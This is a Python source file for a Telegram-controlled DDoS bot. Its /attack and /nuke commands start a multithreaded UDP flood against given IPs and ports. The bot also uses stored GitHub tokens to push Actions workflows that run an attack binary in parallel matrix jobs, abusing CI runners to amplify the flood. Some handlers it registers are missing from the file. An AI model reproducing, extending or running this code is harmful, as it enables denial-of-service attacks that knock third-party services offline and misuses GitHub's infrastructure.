import os
import json
import logging
import threading
import time
import uuid
import asyncio
import socket
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
MAX_THREADS = int(os.environ.get("MAX_THREADS", "500"))
MAX_DURATION = int(os.environ.get("MAX_DURATION", "3600"))
PACKET_SIZE = int(os.environ.get("PACKET_SIZE", "1400"))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_NAME = "spider"
WAITING_FOR_BINARY = 1
WAITING_FOR_TOKEN = 2

# ===== GLOBALS =====
current_attack = None
attack_threads = []
attack_stop_event = threading.Event()
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_stats = {"packets": 0, "bytes": 0, "start_time": 0}

# ===== FILE OPS =====
def load_json(filename, default=None):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except:
        return default if default is not None else {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

def load_owners():
    global owners
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    return owners

def load_github_tokens():
    global github_tokens
    github_tokens = load_json('github_tokens.json', [])
    return github_tokens

def load_approved_users():
    global approved_users
    approved_users = load_json('approved_users.json', {})
    return approved_users

def load_pending_users():
    global pending_users
    pending_users = load_json('pending_users.json', [])
    return pending_users

load_owners()
load_github_tokens()
load_approved_users()
load_pending_users()

# ===== HELPERS =====
def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ============================================================
# ===== EXTREME ATTACK ENGINE =====
# ============================================================

class ExtremeAttack:
    def __init__(self, ip, port, duration, threads=MAX_THREADS):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.threads = min(threads, 1000)
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.stop_event = threading.Event()
        self.executor = ThreadPoolExecutor(max_workers=self.threads)
        self.sock = None
        self._payloads = self._generate_payloads()
        
    def _generate_payloads(self):
        """Generate random payloads for variety"""
        payloads = []
        for _ in range(100):
            size = random.randint(64, PACKET_SIZE)
            payloads.append(os.urandom(size))
        return payloads
    
    def _udp_flood(self, thread_id):
        """Single thread flooder"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
        
        # Randomize source port for each thread
        src_port = random.randint(10000, 65535)
        
        while not self.stop_event.is_set():
            try:
                payload = random.choice(self._payloads)
                sock.sendto(payload, (self.ip, self.port))
                self.packets_sent += 1
                self.bytes_sent += len(payload)
            except:
                pass
        
        sock.close()
    
    def start(self):
        """Launch attack with thread pool"""
        self.running = True
        self.start_time = time.time()
        self.stop_event.clear()
        
        # Start threads
        for i in range(self.threads):
            self.executor.submit(self._udp_flood, i)
        
        # Auto-stop timer
        threading.Timer(self.duration, self.stop).start()
        
        return self
    
    def stop(self):
        """Stop attack"""
        self.running = False
        self.stop_event.set()
        self.executor.shutdown(wait=False)
    
    def get_stats(self):
        """Get current stats"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        rps = self.packets_sent / elapsed if elapsed > 0 else 0
        return {
            "packets": self.packets_sent,
            "bytes": self.bytes_sent,
            "elapsed": int(elapsed),
            "rps": int(rps),
            "mbps": (self.bytes_sent * 8 / 1024 / 1024) / elapsed if elapsed > 0 else 0
        }

# ============================================================
# ===== GITHUB WORKFLOW TRIGGER (EXTREME) =====
# ============================================================

def trigger_github_attacks(ip, port, duration, num_workflows=10):
    """Trigger multiple GitHub workflows for extreme parallel attack"""
    if not github_tokens:
        return False, "No GitHub tokens"
    
    success = 0
    failed = 0
    results = []
    
    # Use multiple tokens and workflows
    for i, token_data in enumerate(github_tokens):
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            # Create multiple workflow files for parallel execution
            for wf_num in range(1, 4):  # 3 workflows per token
                wf_path = f".github/workflows/attack_{wf_num}.yml"
                yml_content = f"""name: attack-{wf_num}
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x {BINARY_NAME}
    - run: sudo ./{BINARY_NAME} {ip} {port} {duration} 350
    - run: sudo ./{BINARY_NAME} {ip} {port} {duration} 350
"""
                try:
                    file = repo.get_contents(wf_path)
                    repo.update_file(wf_path, f"Attack {ip}:{port}", yml_content, file.sha)
                except:
                    repo.create_file(wf_path, f"Attack {ip}:{port}", yml_content)
                
                success += 1
                results.append(f"✅ @{token_data['username']}: workflow {wf_num}")
                
        except Exception as e:
            failed += 1
            results.append(f"❌ @{token_data.get('username', 'unknown')}: {str(e)[:50]}")
    
    return success, failed, results

# ============================================================
# ===== EXTREME UDP ATTACK COMMAND =====
# ============================================================

async def attack_extreme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ultimate attack command with GitHub + Local UDP"""
    user_id = update.effective_user.id
    
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "⚡ **Extreme Attack**\n"
            "Usage: /attack <ip> <port> <time>\n"
            "Example: /attack 1.1.1.1 80 60\n\n"
            "🔥 Uses: GitHub workflows + Local UDP flood"
        )
        return
    
    ip, port_str, time_str = context.args
    try:
        port = int(port_str)
        duration = min(int(time_str), MAX_DURATION)
    except:
        await update.message.reply_text("❌ Invalid numbers")
        return
    
    if not (1 <= port <= 65535) or duration < 5:
        await update.message.reply_text("❌ Port: 1-65535, Time: 5+ sec")
        return
    
    # Check if attack already running
    global current_attack, attack_stats
    if current_attack and current_attack.running:
        await update.message.reply_text(f"⚠️ Attack already running on {current_attack.ip}:{current_attack.port}")
        return
    
    # Start local UDP attack
    attack = ExtremeAttack(ip, port, duration)
    attack.start()
    current_attack = attack
    
    # Trigger GitHub workflows
    await update.message.reply_text(f"🔥 **Extreme Attack Launched!**\n━━━━━━━━━━━━━━━━━\n🎯 `{ip}:{port}`\n⏱️ {duration}s\n🧵 {attack.threads} threads\n━━━━━━━━━━━━━━━━━")
    
    # GitHub workflows
    github_status = await update.message.reply_text("📤 Triggering GitHub workflows...")
    success, failed, results = trigger_github_attacks(ip, port, duration)
    
    await github_status.edit_text(
        f"📊 **GitHub Workflows**\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n"
        f"━━━━━━━━━━━━━━━━━\n" + "\n".join(results[:5])
    )
    
    # Auto status updates
    for _ in range(duration // 10):
        await asyncio.sleep(10)
        if attack and attack.running:
            stats = attack.get_stats()
            try:
                await update.message.reply_text(
                    f"📊 **Attack Stats**\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"📦 Packets: `{stats['packets']:,}`\n"
                    f"📈 RPS: `{stats['rps']:,}`\n"
                    f"💾 Data: `{stats['bytes']/1024/1024:.1f} MB`\n"
                    f"⏱️ Elapsed: `{stats['elapsed']}s`"
                )
            except:
                pass

# ============================================================
# ===== NUKE COMMAND - MULTI TARGET =====
# ============================================================

async def nuke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack multiple targets simultaneously"""
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "💥 **Nuke Command**\n"
            "Usage: /nuke <ip1:port1> <ip2:port2> <duration>\n"
            "Example: /nuke 1.1.1.1:80 2.2.2.2:443 60"
        )
        return
    
    targets = []
    duration = 30
    
    for arg in args:
        if ":" in arg:
            parts = arg.split(":")
            if len(parts) == 2:
                try:
                    targets.append((parts[0], int(parts[1])))
                except:
                    pass
        else:
            try:
                duration = min(int(arg), MAX_DURATION)
            except:
                pass
    
    if not targets:
        await update.message.reply_text("❌ No valid targets")
        return
    
    msg = f"💥 **NUKE LAUNCHED**\n━━━━━━━━━━━━━━━━━\n"
    for ip, port in targets:
        msg += f"🎯 `{ip}:{port}`\n"
    msg += f"⏱️ {duration}s\n━━━━━━━━━━━━━━━━━"
    
    await update.message.reply_text(msg)
    
    # Launch attacks for each target
    for ip, port in targets:
        attack = ExtremeAttack(ip, port, duration, threads=200)
        attack.start()
        
        # Trigger workflows
        trigger_github_attacks(ip, port, duration, num_workflows=3)
        
        await asyncio.sleep(1)  # Stagger start
    
    await update.message.reply_text(f"✅ Nuke complete on {len(targets)} targets")

# ============================================================
# ===== STOP COMMAND =====
# ============================================================

async def stop_extreme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop all attacks"""
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    global current_attack
    if current_attack and current_attack.running:
        target = f"{current_attack.ip}:{current_attack.port}"
        current_attack.stop()
        current_attack = None
        await update.message.reply_text(f"🛑 Attack stopped on `{target}`")
    else:
        await update.message.reply_text("✅ No attack running")

# ============================================================
# ===== STATUS COMMAND =====
# ============================================================

async def status_extreme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get detailed attack status"""
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    global current_attack
    if current_attack and current_attack.running:
        stats = current_attack.get_stats()
        await update.message.reply_text(
            f"🔥 **Attack Status**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🎯 `{current_attack.ip}:{current_attack.port}`\n"
            f"🧵 Threads: `{current_attack.threads}`\n"
            f"📦 Packets: `{stats['packets']:,}`\n"
            f"📈 RPS: `{stats['rps']:,}`\n"
            f"💾 Data: `{stats['bytes']/1024/1024:.1f} MB`\n"
            f"⏱️ Elapsed: `{stats['elapsed']}s`"
        )
    else:
        await update.message.reply_text("✅ No attack running")

# ============================================================
# ===== OTHER COMMANDS (Keep existing) =====
# ============================================================

# Keep all your existing commands: start, addtoken, binary_upload, approve, remove, users, pending, broadcast, maintenance, etc.
# Just add the extreme ones above

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Replace attack command with extreme version
    app.add_handler(CommandHandler("attack", attack_extreme))
    app.add_handler(CommandHandler("nuke", nuke_cmd))
    app.add_handler(CommandHandler("stop", stop_extreme))
    app.add_handler(CommandHandler("status", status_extreme))
    
    # Keep all existing commands
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myid", myid_cmd))
    app.add_handler(CommandHandler("addtoken", addtoken_cmd))
    app.add_handler(CommandHandler("tokens", tokens_cmd))
    app.add_handler(CommandHandler("approve", approve_cmd))
    app.add_handler(CommandHandler("remove", removeuser_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("pending", pending_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("maintenance", maintenance_cmd))
    
    # Binary upload
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload_start)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, binary_upload_receive),
                CommandHandler("cancel", binary_upload_cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
    )
    app.add_handler(conv_handler)
    
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)
    
    logger.info("🚀 EXTREME BOT is running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
